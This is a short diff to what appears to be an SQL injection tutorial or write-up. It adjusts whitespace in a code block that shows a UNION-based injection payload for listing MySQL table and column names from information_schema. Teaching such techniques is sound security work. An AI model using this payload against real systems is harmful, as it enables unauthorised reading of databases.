@@ -47,7 +47,7 @@ There is also an interesting table known as ```information_schema``` in MySQL th
 
 We proceed to inject the follow:
 ```sql
-' UNION SELECT table_name, column_name FROM information_schema.columns WHERE     '1'='1
+' UNION SELECT table_name, column_name FROM information_schema.columns WHERE '1'='1
 ```
     
 Explanation:
